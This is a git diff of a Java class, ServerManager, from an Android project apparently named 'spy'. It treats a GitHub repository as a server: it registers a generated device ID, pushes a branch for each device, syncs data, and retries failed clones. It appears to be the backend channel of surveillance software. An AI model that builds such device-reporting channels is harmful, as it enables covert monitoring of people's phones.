@@ -1,6 +1,8 @@
 package com.gameofcoding.spy.server;
 
+import android.content.Context;
 import com.gameofcoding.spy.utils.FileUtils;
+import com.gameofcoding.spy.utils.Utils;
 import com.gameofcoding.spy.utils.XLog;
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
@@ -24,72 +26,97 @@ public class ServerManager {
     private static final String TAG = "ServerManager";
     /*package*/ static final String BRANCH_MASTER = RepoManager.BRANCH_MASTER;
     /*package*/ static final String BRANCH_APP_DATA = "app_data";
-    
-    /**
+    /*
      * Name of the file that contains the list of devices that has been added to server.
      */
     private final String ADDED_DEVICES_FILE = "addedDevices.json";
-
-    /**
-     * Path to the 
+    /*
+     * Stores the number of retries for downloading repo.
+    */
+    private int mRetries;
+    /*
+     * Path to the root directory of repository.
      */
-    private File mServerRootDir;
+    private File mRepoRootDir;
+    /*
+     * Name of the branch of current device.
+     */
     private String mDeviceBranch;
-
+    //private Context mContext;
     private RepoManager mGitRepo = new RepoManager();
-    
-    public ServerManager(File serverRootDir, String deviceUniqueId) {
-	mServerRootDir = serverRootDir;
-	mDeviceBranch = deviceUniqueId;
+
+    public ServerManager(Context context, File repoRootDir) {
+	//mContext = context;
+	mRepoRootDir = repoRootDir;
+	mDeviceBranch = new Utils(context).generateDeviceId();
     }
 
-    private boolean downloadGitRepo() throws InvalidRemoteException, TransportException,
-					     GitAPIException, IOException {
-	if(mServerRootDir.exists()) {
-	    if(!FileUtils.deleteForcefully(mServerRootDir))
-		return false;
-	}
-	
-	// Remote branches to clone
-	List<String> branchesToClone = new ArrayList<String>();
-	branchesToClone.add(BRANCH_MASTER);
-	branchesToClone.add(BRANCH_APP_DATA);
-	
-	// Clone repo with above branch and device branch if exists
-	if(mGitRepo.clone(mServerRootDir, branchesToClone)) {
-	    if(deviceExists()) {
-		XLog.i(TAG, "downloadGitRepo(): Device already exists, fetching its remote branch...");
-		if(mGitRepo.fetchBranch(mDeviceBranch)) {
-		    mGitRepo.createBranch(mDeviceBranch, mDeviceBranch);
-		    XLog.i(TAG, "downloadGitRepo(): Fetched device remote branch");
-		    return true;
-        	} else {
-		    XLog.e(TAG, "downloadGitRepo(), Could'nt fetech device remote branch");
-		    return false;
-		}
-	    } else {
-		XLog.i(TAG, "Device not added previously, adding device...");
-		
-		// Create empty local branch an remote branch for device
-		mGitRepo.checkoutOrphanBranch(mDeviceBranch);
-		mGitRepo.push(mDeviceBranch, mDeviceBranch);
-		mGitRepo.setRemoteTrackingBranch(mDeviceBranch, mDeviceBranch);
+    public Server loadServer() {
+	return loadServer(false);
+    }
 
-		// Do entry of device
-		mGitRepo.checkout(BRANCH_MASTER);
-		addDevice();
-		mGitRepo.commit("added device, " + mDeviceBranch);
-		mGitRepo.push();
-		
-		XLog.i(TAG, "Device '" + mDeviceBranch + "' added to server.");
-		return true;
-            }
+    /**
+     * Returns path of the root directory of repository
+     */
+    public File getRepoRootDir() {
+	return mRepoRootDir;
+    }
+
+    /**
+     * Loads the git repo. If it was'nt cloned previously it calls downloadGitRepo() in order to
+     * clone it otherwise it just pulls the branches (if specified) and initialzes the RepoManager.
+     */
+    public Server loadServer(boolean reloadData) {
+	if(mRetries > 5) {
+	    XLog.w(TAG, "Unable to load server, exceeded number of retries");
+	    return null;
+	} else  mRetries++;
+
+	try {
+	    boolean hasClonedRepo = false;
+	    if(!mRepoRootDir.exists()) {
+		// We have not cloned repositoru yet, clone it.
+		if(!downloadGitRepo()) {
+		    XLog.i(TAG,"Failed to download repo, retrying to load server...");
+		    return loadServer();
+		}
+		hasClonedRepo = true;
+	    }
+	    mGitRepo.loadRepo(mRepoRootDir);
+
+	    // Validate repo
+	    if(!(mGitRepo.hasLocalBranch(BRANCH_MASTER)
+                 && mGitRepo.hasLocalBranch(mDeviceBranch))) {
+		XLog.w(TAG, "Invalide repository. Does not contain all branches.");
+		if(FileUtils.delete(mRepoRootDir))
+		    XLog.i(TAG , "loadServer(): Repo directory deleted");
+		else
+		    XLog.w(TAG, "loadServer(): Repo directory could not be deleted");
+		XLog.i(TAG, "Retrying to load server...");
+		return loadServer();
+	    } else XLog.i(TAG, "Valid repository.");
+
+	    // Pull data from repo.
+	    Server server = new Server(mGitRepo, mDeviceBranch);
+	    if(!(hasClonedRepo) && reloadData) {
+		XLog.i(TAG, "loadServer(): Syncing all directories with server.");
+		server.reloadData();
+		XLog.i(TAG, "loadServer(): All directories successfully synced.");
+	    }
+	    return new Server(mGitRepo, mDeviceBranch);
+	} catch(Exception e) {
+	    XLog.e(TAG, "loadServer(): Exception occured while loading repo.", e);
+	    if(FileUtils.delete(mRepoRootDir))
+		XLog.i(TAG , "loadServer(): Repo directory deleted");
+	    else
+		XLog.w(TAG, "loadServer(): Repo directory could not be deleted");
+	    XLog.i(TAG, "Retrying to load server...");
+	    return loadServer();
 	}
-	return false;
     }
 
     private boolean deviceExists() {
-	File file = new File(mServerRootDir, ADDED_DEVICES_FILE);
+	File file = new File(mRepoRootDir, ADDED_DEVICES_FILE);
 	try {
 	    if(!file.exists()) {
 		XLog.w(TAG, "File that stores added device ids does not exisr, creating new one");
@@ -111,8 +138,10 @@ public class ServerManager {
 	    JSONArray devices = new JSONArray(jsonFileData);
 	    for(int i = 0; i < devices.length(); i++) {
 		String device = devices.getString(i);
-		if(device.equals(mDeviceBranch))
+		if(device.equals(mDeviceBranch)) {
+		    // Device exists
 		    return true;
+		}
 	    }
 	} catch(IOException e) {
 	    XLog.e(TAG, "Error occurred while handling file for checking device ids, file=" + file, e);
@@ -121,9 +150,9 @@ public class ServerManager {
 	}
 	return false;
     }
-    
+
     private boolean addDevice() {
-	File file = new File(mServerRootDir, ADDED_DEVICES_FILE);
+	File file = new File(mRepoRootDir, ADDED_DEVICES_FILE);
 	try {
 	    if(!file.exists()) {
 		XLog.w(TAG, "File that stores added device ids does not exist, creating new one");
@@ -156,40 +185,57 @@ public class ServerManager {
 	} catch(JSONException e) {
 	    XLog.e(TAG, "Error occurred while parsing json data from file, file=" + file, e);
 	}
-	return false;	
+	return false;
     }
 
-    public Server loadServer(boolean reloadData) {
-	try {
-	    boolean hasClonedRepo = false;
-	    if(!mServerRootDir.exists()) {
-		if(!downloadGitRepo())
-		    return null;
-		hasClonedRepo = true;
-	    }
-	    mGitRepo.loadRepo(mServerRootDir);
-	    Server server = new Server(mGitRepo, mDeviceBranch);
-	    if(!hasClonedRepo && reloadData) {
-		XLog.i(TAG, "loadServer(): Syncing all directories with server.");
-		server.reloadData();
-		XLog.i(TAG, "loadServer(): All directories successfully synced.");
-	    }
-	    return new Server(mGitRepo, mDeviceBranch);
-	} catch(Exception e) {
-	    XLog.e(TAG, "loadServer(): Exception occured while loading repo.", e);
-	    if(FileUtils.deleteForcefully(mServerRootDir))
-		XLog.i(TAG , "loadServer(): Repo directory deleted");
-	    else
-		XLog.w(TAG, "loadServer(): Repo directory could not be deleted");
-	    return null;
+    /**
+     * Downloads the github repository, which acts as a server for this app.
+     * <b>NOTE: It does not clones all the branches, it just clones master, app_data and devices
+     * branch (if previously exists).</b>
+     */
+    private boolean downloadGitRepo() throws InvalidRemoteException, TransportException,
+					     GitAPIException, IOException {
+	if(mRepoRootDir.exists()) {
+	    if(!FileUtils.delete(mRepoRootDir))
+		return false;
 	}
-    }
 
-    public Server loadServer() {
-	return loadServer(false);
-    }
+	// Remote branches to clone
+	List<String> branchesToClone = new ArrayList<String>();
+	branchesToClone.add(BRANCH_MASTER);
 
-    public File getServerRootDir() {
-	return mServerRootDir;
+	// Clone repo with above branch and device branch (if exists)
+	if(mGitRepo.clone(mRepoRootDir, branchesToClone)) {
+	    if(deviceExists()) {
+		// Device previously exists, fetch its branch
+		XLog.i(TAG, "downloadGitRepo(): Device already exists, deleting its remote branch...");
+		if(mGitRepo.deleteRemoteBranch(mDeviceBranch)) {
+		    XLog.i(TAG, "downloadGitRepo(): Device's remote branch deleted successfully");
+        	} else {
+		    XLog.e(TAG, "downloadGitRepo(), Could'nt delete device's remote branch");
+		    return false;
+		}
+	    } else {
+		XLog.i(TAG, "Device not added previously, adding device...");
+
+		// Do entry of device
+		XLog.i(TAG, "Adding device...");
+		mGitRepo.checkout(BRANCH_MASTER);
+		addDevice();
+		mGitRepo.commit("added device, " + mDeviceBranch);
+		mGitRepo.push();
+		XLog.i(TAG, "Device entry done.");
+	    }
+
+	    // Create empty local branch an remote branch for device
+	    XLog.i(TAG, "Pushing new branch for device");
+	    mGitRepo.checkoutOrphanBranch(mDeviceBranch);
+	    mGitRepo.push(mDeviceBranch, mDeviceBranch);
+	    mGitRepo.setRemoteTrackingBranch(mDeviceBranch, mDeviceBranch);
+
+	    XLog.i(TAG, "Device '" + mDeviceBranch + "' added to server.");
+	    return true;
+	}
+	return false;
     }
 }
